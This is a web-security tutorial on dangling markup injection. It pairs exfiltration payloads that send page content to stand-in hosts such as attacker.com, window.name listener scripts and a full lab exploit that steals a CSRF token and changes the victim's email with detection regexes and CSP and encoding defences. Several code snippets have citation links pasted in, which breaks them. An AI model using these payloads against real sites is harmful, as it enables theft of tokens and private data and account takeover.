# Dangling Markup Injection

Dangling markup injection is a sophisticated cross-domain data exfiltration technique used when traditional cross-site scripting attacks are blocked by input filters, Content Security Policy, or other security mechanisms. Unlike full XSS which requires executing arbitrary JavaScript, dangling markup exploits the browser's lenient HTML parsing behavior to capture sensitive data by injecting incomplete HTML tags or attributes that remain "dangling"—the browser then automatically completes these structures by consuming subsequent page content until it finds an appropriate closing delimiter, inadvertently including sensitive information like CSRF tokens, email messages, personal data, or API keys in requests to attacker-controlled servers. This technique is particularly effective against applications with strict Content Security Policies that prevent inline script execution but still allow certain HTML tags like `<img>`, `<iframe>`, or `<base>` to load external resources. The fundamental vulnerability arises when applications embed user-controllable data into HTML responses without properly encoding special characters like angle brackets `<>` or quotes `"'`, allowing attackers to break out of existing HTML contexts and inject partial tags with unclosed attributes—the browser's HTML parser then reads ahead through the page source, treating everything until the next matching delimiter as part of the injected attribute value, effectively leaking portions of the response that may contain secrets. 

The core exploitation mechanism: **inject incomplete HTML structures that consume subsequent content until closed by existing page delimiters**.

## What is Dangling Markup Injection?

### Understanding dangling markup

**Definition:** A technique for capturing cross-domain data by injecting incomplete HTML tags or attributes that cause browsers to inadvertently include sensitive page content in requests to attacker-controlled servers, exploiting lenient HTML parsing when full XSS is blocked.

**Key characteristics:**
- Works without JavaScript execution
- Bypasses many XSS filters and CSP restrictions
- Exploits browser HTML parsing behavior
- Captures data between injection point and closing delimiter
- Particularly effective for stealing CSRF tokens
- Requires less strict filtering to block than XSS

**Comparison with traditional XSS:**

```
Traditional XSS:
Requirement: Execute arbitrary JavaScript
Goal: Run attacker's code in victim's browser
Blocked by: Input filters, CSP, XSS Auditor, NoScript
Defense: script-src directives, nonce/hash requirements

Dangling Markup:
Requirement: Inject incomplete HTML tags/attributes
Goal: Exfiltrate data from page to attacker's server
Blocked by: Encoding < > " characters, strict CSP on all resources
Defense: Requires broader resource loading restrictions

Advantage of dangling markup:
- Works when JavaScript blocked
- Bypasses script-src CSP restrictions
- Evades many XSS filters (no <script> tags)
- No eval(), Function(), or dangerous sinks needed
```

### How browser HTML parsing enables the attack

**Browser parsing behavior:**

```html
<!-- Normal complete HTML -->
<img src="https://example.com/image.jpg" alt="description">
Browser parsing:
1. Sees <img tag
2. Reads src attribute (finds opening ")
3. Continues until closing "
4. Reads alt attribute
5. Closes tag with >

<!-- Incomplete HTML (dangling) -->
<img src="https://attacker.com/capture?data=
Browser parsing:
1. Sees <img tag
2. Reads src attribute (finds opening ")
3. Continues looking for closing "
4. Reads everything as part of src value:
   - Next elements
   - Text content
   - Hidden form fields
   - CSRF tokens
   - Continues until finds next "
5. Everything becomes part of URL
6. Makes request to attacker.com with all captured data
```

**Example vulnerable response:**

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Search Results</h1>
    <input type="text" name="search" value="USER_INPUT_HERE">
    
    <input type="hidden" name="csrf_token" value="abc123xyz789secrettoken">
    
    <div class="results">
        <!-- Search results here -->
    </div>
</body>
</html>
```

**Attack scenario:**

```
Attacker input: "><img src='//attacker.com/steal?

Rendered HTML:
<input type="text" name="search" value=""><img src='//attacker.com/steal?">
    
<input type="hidden" name="csrf_token" value="abc123xyz789secrettoken">

Browser parsing:
1. Closes search input value attribute with "
2. Closes search input tag with >
3. Sees new <img tag
4. Starts reading src attribute (single quote delimiter)
5. Looks for closing single quote '
6. Reads everything until next single quote:
   - ">
   - <input type="hidden" name="csrf_token" value="abc123xyz789secrettoken">
7. Makes HTTP request:
   GET //attacker.com/steal?">
   <input type="hidden" name="csrf_token" value="abc123xyz789secrettoken HTTP/1.1

Attacker receives:
Full content between injection point and next single quote
Including CSRF token: abc123xyz789secrettoken
```

### Why traditional defenses fail

**XSS filters often miss dangling markup:**

```
XSS filter blocks:
<script>alert(1)</script>           ✓ Blocked (script tag)
<img src=x onerror=alert(1)>        ✓ Blocked (event handler)
<iframe src=javascript:alert(1)>    ✓ Blocked (javascript: protocol)

XSS filter may allow:
"><img src='//attacker.com/steal?   ✗ Not blocked (no dangerous keywords)
"><base href='//attacker.com/'>     ✗ Not blocked (legitimate tag)
"><iframe name='                    ✗ Not blocked (no execution)

Reason:
- No script tags
- No event handlers
- No javascript: protocol
- No eval() or dangerous functions
- Appears as benign HTML injection
```

**CSP often insufficient:**

```
Typical CSP:
Content-Security-Policy: default-src 'self'; script-src 'self'

Prevents:
- Inline scripts <script>alert(1)</script>
- External scripts <script src="//evil.com/xss.js">
- Event handlers onclick=alert(1)
- javascript: URLs

Still allows:
- Images <img src='//attacker.com/capture?
- Iframes <iframe name='
- Base tags <base target='
- Form actions <form action='//attacker.com/'>

Dangling markup works with allowed tags!
```

## Attack Vectors and Techniques

### Vector 1: Image tag with unclosed src

**Most common dangling markup vector:**

**Vulnerable code:**
```html
<input type="text" name="email" value="USER_INPUT">
<input type="hidden" name="csrf" value="SECRET_TOKEN">
```

**Attack payload:**
```html
"><img src='https://attacker.com/capture?
```

**Rendered result:**
```html
<input type="text" name="email" value=""><img src='https://attacker.com/capture?">
<input type="hidden" name="csrf" value="SECRET_TOKEN">
```

**Browser behavior:**
```
Parsing flow:
1. Closes email input value
2. Creates img element
3. Starts reading src attribute (single quote delimiter)
4. Reads until next single quote found
5. Everything becomes src URL

HTTP request generated:
GET /capture?">
<input type="hidden" name="csrf" value="SECRET_TOKEN HTTP/1.1
Host: attacker.com

URL encoding applied:
GET /capture?%22%3E%0A%3Cinput%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22SECRET_TOKEN HTTP/1.1

Attacker receives:
Query parameter containing CSRF token embedded in HTML
```

**Extracting token from captured data:**

```javascript
// Attacker's server logs request
// URL: /capture?%22%3E%0A%3Cinput%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22SECRET_TOKEN

// Decode URL parameter
const captured = decodeURIComponent(queryParams.get('data'));
// Result: ">
// <input type="hidden" name="csrf" value="SECRET_TOKEN

// Parse HTML to extract token
const match = captured.match(/name="csrf" value="([^"]+)"/);
if (match) {
    const csrfToken = match [portswigger](https://portswigger.net/web-security/cross-site-scripting/dangling-markup);
    console.log('Stolen CSRF token:', csrfToken);
    // Use token for CSRF attack
}
```

### Vector 2: Iframe with unclosed name attribute

**Using iframe for data capture:**

**Payload:**
```html
"><iframe name='
```

**Rendered HTML:**
```html
<input value=""><iframe name='">
<input type="hidden" name="csrf" value="SECRET_TOKEN">
<form method="post" action="/change-email">
    ...
</form>
```

**Exploitation:**
```
Browser behavior:
1. Creates iframe element
2. name attribute starts with single quote
3. Reads until next single quote
4. Everything becomes iframe's name

iframe.name property:
Contains all captured content including CSRF token

Attack flow:
1. Inject iframe with unclosed name
2. Create link to attacker's page
3. When clicked, opens in iframe
4. Attacker's page reads window.name
5. window.name contains captured data (cross-domain readable!)

Attacker's collection page:
<script>
// Read data from window.name (cross-domain!)
const stolenData = window.name;
console.log('Captured data:', stolenData);

// Send to attacker's server
fetch('https://attacker.com/log', {
    method: 'POST',
    body: stolenData
});
</script>
```

### Vector 3: Base tag with unclosed target

**Using base target for exfiltration:** 

**Payload:**
```html
<base target='
```

**How it works:**

```html
Page before injection:
<body>
    <input type="text" value="INJECTION">
    <input type="hidden" name="csrf" value="SECRET">
    <a href="/profile">My Profile</a>
    <a href="/logout">Logout</a>
</body>

After injection:
<body>
    <input type="text" value="<base target='">
    <input type="hidden" name="csrf" value="SECRET">
    <a href="/profile">My Profile</a>
    <a href="/logout">Logout</a>
</body>

Effect:
<base target='...captured content until next single quote...'>

Every link now opens in window/frame named with captured data!

When victim clicks link:
1. Link opens in window with name = captured data
2. Attacker's page loaded in new window
3. window.name contains captured data
4. Attacker reads window.name (cross-domain accessible)
```

**Complete exploit:**

```html
<!-- Attacker's page -->
<a href="https://victim-site.com/?input=<base target='">
    <font size=100 color=red>CLICK ME FOR PRIZE!</font>
</a>

<!-- When victim clicks attacker's link: -->
1. Navigates to victim-site.com with dangling markup
2. Page renders with <base target='...(csrf token)...'
3. Victim clicks any link on victim-site.com
4. Link opens in new window named with CSRF token
5. New window navigates to attacker-controlled listener page

<!-- Listener page reads data: -->
<script>
const stolenToken = window.name;
fetch('https://attacker.com/log', {
    method: 'POST',
    body: stolenToken
});
</script>
```

### Vector 4: Form hijacking with unclosed action

**Manipulating form submissions:**

**Payload:**
```html
"><form action='https://attacker.com/capture' method='POST'>
```

**Scenario:**
```html
Original page:
<input type="email" name="email" value="USER_INPUT">
<form action="/change-password" method="POST">
    <input type="hidden" name="csrf" value="SECRET_TOKEN">
    <input type="password" name="new_password">
    <button type="submit">Change Password</button>
</form>

After injection:
<input type="email" name="email" value=""><form action='https://attacker.com/capture' method='POST'>
<input type="hidden" name="csrf" value="SECRET_TOKEN">
<form action="/change-password" method="POST">
    <input type="password" name="new_password">
    <button type="submit">Change Password</button>
</form>

Result:
First form hijacks hidden CSRF field
When original form submitted → Data sent to attacker.com
```

### Vector 5: Link with unclosed href (Chrome pre-92)

**Historical vector (now mitigated in Chrome):**

**Payload:**
```html
"><a href='https://attacker.com/log?data=
```

**Browser parsing:**
```html
<input value=""><a href='https://attacker.com/log?data=">
<input type="hidden" name="csrf" value="SECRET">
<span>Sensitive data here</span>
```

**Chrome 92+ mitigation:**
```
Chrome blocks URLs containing raw characters:
- Angle brackets: < >
- Newlines: \n \r
- Other control characters

Reason:
Captured data typically contains these characters
Attack blocked because URL considered invalid

Example:
href value contains: ">
<input type="hidden" name="csrf" value="SECRET
Browser rejects URL with < and > characters
Request not sent

Status: Mitigated in modern Chrome/Edge
Still works: Firefox, Safari (partial mitigation)
```

## Real-World Attack Scenarios

### Scenario 1: Stealing CSRF tokens

**Target application:**
```html
<!-- Change email form -->
<form action="/account/email" method="POST">
    <label>Email:</label>
    <input type="email" name="email" value="user@example.com">
    
    <input type="hidden" name="csrf_token" value="abc123secrettoken789">
    
    <button type="submit">Update Email</button>
</form>
```

**Attack flow:**

**Step 1: Find injection point**
```html
<!-- Email parameter reflected in page -->
GET /account?email=TEST_REFLECTION

Response includes:
<div class="notification">Email confirmation sent to: TEST_REFLECTION</div>
```

**Step 2: Inject dangling markup**
```html
Payload: "><img src='https://attacker.com/capture?data=

URL: /account?email=%22%3E%3Cimg%20src%3D%27https%3A%2F%2Fattacker.com%2Fcapture%3Fdata%3D

Rendered:
<div class="notification">Email confirmation sent to: "><img src='https://attacker.com/capture?data=</div>
<form action="/account/email" method="POST">
    <input type="hidden" name="csrf_token" value="abc123secrettoken789">
```

**Step 3: Victim visits malicious link**
```
Attacker sends phishing email:
"Your account needs verification: https://victim-site.com/account?email=PAYLOAD"

Victim clicks link
Browser makes request to attacker.com with CSRF token in URL
```

**Step 4: Extract and use token**
```javascript
// Attacker's server receives:
GET /capture?data=%3C%2Fdiv%3E%0A%3Cform%20action%3D%22%2Faccount%2Femail%22%20method%3D%22POST%22%3E%0A%20%20%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22csrf_token%22%20value%3D%22abc123secrettoken789

// Decode and parse
const html = decodeURIComponent(params.data);
const tokenMatch = html.match(/csrf_token" value="([^"]+)"/);
const csrfToken = tokenMatch [portswigger](https://portswigger.net/web-security/cross-site-scripting/dangling-markup);  // abc123secrettoken789

// Now perform CSRF attack with stolen token
```

**Step 5: Execute CSRF attack**
```html
<!-- Attacker's CSRF attack page -->
<form id="csrf-form" action="https://victim-site.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf_token" value="abc123secrettoken789">
</form>
<script>
document.getElementById('csrf-form').submit();
</script>

<!-- Result: Victim's email changed to attacker's email -->
<!-- Attacker can now reset password and take over account -->
```

### Scenario 2: Capturing email content

**Webmail application:**
```html
<!-- Email view page -->
<div class="email">
    <div class="from">From: USER_INPUT</div>
    <div class="subject">Subject: Meeting Tomorrow</div>
    <div class="body">
        Here are the confidential financial reports...
        Q4 Revenue: $5M
        Bank Account: 1234567890
        ...
    </div>
</div>
```

**Attack:**
```html
Payload in 'from' field: "><img src='//attacker.com/email?content=

Rendered:
<div class="from">From: "><img src='//attacker.com/email?content=</div>
<div class="subject">Subject: Meeting Tomorrow</div>
<div class="body">
    Confidential financial reports...
</div>

Attacker receives:
Entire email content until next single quote found
Including sensitive financial information
```

### Scenario 3: Bypassing strict CSP

**Application CSP:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

**Analysis:**
```
CSP blocks:
- Inline scripts ✓
- External scripts ✓
- eval() ✓
- Event handlers ✓

CSP allows:
- Images (default-src 'self' → img-src 'self')
- No img-src specified → Falls back to default-src

Problem:
default-src 'self' → Still blocks external images

Need different vector...
```

**Bypass using base tag:**
```html
Payload: <base target='

CSP effect:
- base tags allowed by CSP (HTML structure)
- target attribute doesn't load external resources
- No CSP violation

Attack:
1. Inject: <base target='
2. Captured data becomes window.name
3. Victim clicks any link
4. Opens in window with sensitive data as name
5. Attacker reads window.name cross-domain

CSP bypassed: No external resource loaded
Data still exfiltrated via window.name mechanism
```

## Lab Walkthrough: Dangling Markup with Strict CSP

**Lab scenario:** Reflected XSS protected by very strict CSP, with dangling markup attack

**Objective:** Steal victim's CSRF token and change their email address

**Lab setup:**
```http
Content-Security-Policy: default-src 'none'; script-src 'self'

- Blocks all external resources
- No img, iframe, object, etc. to external domains
- script-src 'self' only
```

**Step 1: Identify reflection point**

```html
Email parameter reflected:
GET /email?email=test@test.com

Response:
<input type="email" name="email" value="test@test.com">
```

**Step 2: Test for XSS**

```html
Payload: <script>alert(1)</script>

Result: Blocked by CSP (script-src 'self')

Payload: <img src='//attacker.com/test'>

Result: Blocked by CSP (img-src not allowed, default-src 'none')

Need alternative vector...
```

**Step 3: Use base tag with dangling target**

```html
Payload for email parameter:
"><a href="https://YOUR-EXPLOIT-SERVER/capture"><font size=100 color=red>CLICK ME</font></a><base target='

Breakdown:
"> → Close input value and tag
<a href="..."> → Create prominent link to exploit server
<font size=100 color=red> → Make link very visible
<base target=' → Start dangling target attribute (never closed)
```

**Step 4: Rendered HTML**

```html
<input type="email" name="email" value=""><a href="https://exploit-server/capture"><font size=100 color=red>CLICK ME</font></a><base target='">

<input type="hidden" name="csrf" value="CSRF_TOKEN_HERE">
<form action="/my-account/change-email" method="POST">
    ...
</form>
<a href="/my-account">My Account</a>

Effect of dangling target:
<base target='...(everything until next single quote)...'>

Target contains:
">
<input type="hidden" name="csrf" value="CSRF_TOKEN_HERE">
<form action="/my-account/change-email" method="POST">
    ...
</form>
<a href="/my-account">My Account</a>
```

**Step 5: Exploit server code**

```html
<!-- Exploit server body -->
<script>
if (window.name) {
    // Captured data in window.name
    var capturedData = window.name;
    
    // Extract CSRF token
    var csrfMatch = capturedData.match(/name="csrf" value="([^"]+)"/);
    if (csrfMatch) {
        var csrfToken = csrfMatch [portswigger](https://portswigger.net/web-security/cross-site-scripting/dangling-markup);
        
        // Perform CSRF attack: Change victim's email
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email';
        
        var emailInput = document.createElement('input');
        emailInput.name = 'email';
        emailInput.value = 'attacker@evil.com';
        form.appendChild(emailInput);
        
        var csrfInput = document.createElement('input');
        csrfInput.name = 'csrf';
        csrfInput.value = csrfToken;
        form.appendChild(csrfInput);
        
        document.body.appendChild(form);
        form.submit();
    }
} else {
    // First visit: Redirect to vulnerable page with payload
    var payload = '"><a href="https://YOUR-EXPLOIT-SERVER/capture"><font size=100 color=red>CLICK ME</font></a><base target=\'';
    location = 'https://YOUR-LAB-ID.web-security-academy.net/?email=' + encodeURIComponent(payload);
}
</script>
```

**Step 6: Attack flow**

```
1. Victim visits exploit server
2. JavaScript redirects to lab with dangling markup payload
3. Page renders with prominent "CLICK ME" link and dangling <base target='
4. Victim clicks "CLICK ME" (user interaction required)
5. Opens exploit server in new window
6. Window name = captured content including CSRF token
7. Exploit server JavaScript reads window.name
8. Extracts CSRF token from captured data
9. Submits form to change email with valid CSRF token
10. Email changed → Lab solved!
```

**Step 7: Deliver to victim**

```
Click "Deliver exploit to victim" button
Lab simulates victim:
1. Visiting exploit server
2. Being redirected to vulnerable page
3. Clicking the prominent link
4. Having their email changed

Lab solved!
```

## Advanced Techniques

### Multi-stage exfiltration

**Character-by-character extraction:**

```html
<!-- For binary search / timing-based extraction -->

<!-- Stage 1: Determine token length -->
<img src='//attacker.com/len?d=
<!-- Captures until next delimiter, measure response length -->

<!-- Stage 2: Extract first character -->
<img src='//attacker.com/char1?d=
<!-- Captures token, parse first character -->

<!-- Stage 3: Build complete token -->
<!-- Repeat for each character position -->
```

### CSS injection combined with dangling markup 

**Using CSS selectors to target specific data:**

```html
<!-- Inject CSS that leaks data based on attributes -->
<style>
input[name="csrf"][value^="a"] { background: url('//attacker.com/token-starts-a'); }
input[name="csrf"][value^="b"] { background: url('//attacker.com/token-starts-b'); }
/* ... for each character ... */
</style>

<!-- Combined with dangling markup for full extraction -->
<base target='
```

### WebRTC-based exfiltration

**Using WebRTC data channels (when CSP allows):**

```html
<!-- Establish WebRTC connection -->
<script>
// Even with strict CSP, some WebRTC operations may work
// Use for bidirectional data exfiltration
</script>
```

## Detection and Monitoring

### Server-side detection

**Log analysis patterns:**

```
Suspicious indicators:

1. Incomplete HTML tags in input:
   - Logs show: email="><img src='https://
   - Missing closing quote or bracket
   - Tag or attribute appears unfinished

2. Unusual requests to external domains:
   - Query strings containing HTML fragments
   - URL-encoded angle brackets in parameters
   - Long query strings with form field patterns

3. Base64 or URL-encoded attack patterns:
   - Decoded payloads reveal incomplete tags
   - Pattern matching for common vectors
```

**Example detection regex:**

```javascript
// Detect dangling markup patterns
const danglingPatterns = [
    /["']><(?:img|iframe|base|link|script)[^>]*(?:src|href|target)=["'][^"']*$/i,
    /<base\s+target=["'][^"']*$/i,
    /<img\s+src=["'][^"']*$/i,
    /<iframe\s+name=["'][^"']*$/i
];

function detectDanglingMarkup(input) {
    return danglingPatterns.some(pattern => pattern.test(input));
}

// Usage
const userInput = req.query.email;
if (detectDanglingMarkup(userInput)) {
    logger.warn('Potential dangling markup attack', { input: userInput, ip: req.ip });
    return res.status(400).send('Invalid input');
}
```

### Client-side detection

**Browser security features:**

```javascript
// Chrome's raw character blocking (Chrome 92+)
// Automatically blocks URLs containing:
// - Angle brackets: < >
// - Newlines: \n \r
// - Tab characters: \t

// Effective against:
<img src='//attacker.com/steal?data=...HTML_WITH_BRACKETS...'>
// Blocked: URL contains < and >

// Still vulnerable:
<base target='...DATA_WITHOUT_BRACKETS...'>
// Allowed: target attribute, window.name exfiltration
```

## Prevention Strategies

### Primary defense: Output encoding

**Context-aware HTML encoding:**

```php
<?php
// Encode ALL special characters
function encodeForHTML($input) {
    return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

// Usage
$email = $_GET['email'];
?>
<input type="email" name="email" value="<?= encodeForHTML($email) ?>">

<!-- Attack payload encoded: -->
Input: "><img src='//attacker.com/steal?
Output: &quot;&gt;&lt;img src=&#039;//attacker.com/steal?

<!-- Rendered safely: -->
<input type="email" name="email" value="&quot;&gt;&lt;img src=&#039;//attacker.com/steal?">

<!-- No HTML injection possible -->
```

**JavaScript encoding for JS contexts:**

```javascript
function encodeForJavaScript(str) {
    return str
        .replace(/\\/g, '\\\\')
        .replace(/</g, '\\x3c')
        .replace(/>/g, '\\x3e')
        .replace(/"/g, '\\"')
        .replace(/'/g, "\\'")
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r');
}
```

### Secondary defense: Input validation

**Strict allowlist validation:**

```javascript
// Validate email format
function validateEmail(email) {
    // Reject any input containing HTML characters
    if (/<|>|"|'/.test(email)) {
        return false;
    }
    
    // Validate proper email format
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(email);
}

// Usage
const email = req.query.email;
if (!validateEmail(email)) {
    return res.status(400).send('Invalid email format');
}
```

**Character filtering:**

```python
import re

def sanitize_input(user_input):
    # Remove dangerous characters
    dangerous_chars = ['<', '>', '"', "'", '`']
    sanitized = user_input
    
    for char in dangerous_chars:
        sanitized = sanitized.replace(char, '')
    
    # Limit length
    if len(sanitized) > 100:
        sanitized = sanitized[:100]
    
    return sanitized
```

### Tertiary defense: Strict Content Security Policy

**Comprehensive CSP to block dangling markup:**

```http
Content-Security-Policy:
    default-src 'none';
    script-src 'nonce-RANDOM';
    style-src 'nonce-RANDOM';
    img-src 'self';
    font-src 'self';
    connect-src 'self';
    frame-src 'none';
    base-uri 'none';
    form-action 'self';
    
Explanation:
default-src 'none' → Block everything by default
script-src 'nonce-...' → Only scripts with valid nonce
img-src 'self' → Images only from same origin (blocks external exfiltration)
base-uri 'none' → Prevent <base> tag injection entirely
form-action 'self' → Forms only submit to same origin
frame-src 'none' → No iframes allowed

Effect on dangling markup:
✓ Blocks external image requests
✓ Blocks base tag injection
✓ Blocks iframe name exfiltration
✓ Blocks form hijacking to external domains

Remaining vectors:
✗ window.name still readable cross-domain (browser behavior, not CSP)
✗ Requires additional mitigations
```

**Base-uri directive specifically:**

```http
Content-Security-Policy: base-uri 'none'

Effect:
- Prevents ALL <base> tags
- Blocks: <base href='...'> and <base target='...'>
- Eliminates base tag dangling markup vector completely

Recommendation:
Always set base-uri to 'none' unless explicitly needed
```

### Additional defense: Response headers

**X-Content-Type-Options:**

```http
X-Content-Type-Options: nosniff

Prevents:
- Browser MIME type sniffing
- Interpreting non-HTML as HTML
- Reduces attack surface
```

**X-Frame-Options:**

```http
X-Frame-Options: DENY

Prevents:
- Page being loaded in iframe
- Reduces some dangling markup vectors
- Blocks iframe-based attacks
```

### Secure coding example

**Complete secure implementation:**

```javascript
const express = require('express');
const crypto = require('crypto');
const app = express();

// Generate nonce for CSP
app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('base64');
    next();
});

// Set strict CSP
app.use((req, res, next) => {
    const nonce = res.locals.nonce;
    res.setHeader(
        'Content-Security-Policy',
        `default-src 'none'; ` +
        `script-src 'nonce-${nonce}'; ` +
        `style-src 'nonce-${nonce}'; ` +
        `img-src 'self'; ` +
        `font-src 'self'; ` +
        `connect-src 'self'; ` +
        `base-uri 'none'; ` +
        `form-action 'self';`
    );
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    next();
});

// HTML encoding function
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// Input validation
function validateEmail(email) {
    if (!email || typeof email !== 'string') return false;
    if (/<|>|"|'/.test(email)) return false;
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(email);
}

// Secure endpoint
app.get('/account', (req, res) => {
    const email = req.query.email || '';
    
    // Validate
    if (email && !validateEmail(email)) {
        return res.status(400).send('Invalid email format');
    }
    
    // Encode for output
    const safeEmail = escapeHtml(email);
    
    // Generate CSRF token (not shown in response)
    const csrfToken = crypto.randomBytes(32).toString('hex');
    req.session.csrfToken = csrfToken;
    
    // Render with nonce
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Account</title>
        </head>
        <body>
            <h1>Account Settings</h1>
            <form action="/change-email" method="POST">
                <input type="email" name="email" value="${safeEmail}">
                <input type="hidden" name="csrf" value="${csrfToken}">
                <button type="submit">Update</button>
            </form>
            <script nonce="${res.locals.nonce}">
                // Only scripts with valid nonce execute
                console.log('Page loaded securely');
            </script>
        </body>
        </html>
    `);
});

app.listen(3000);
```
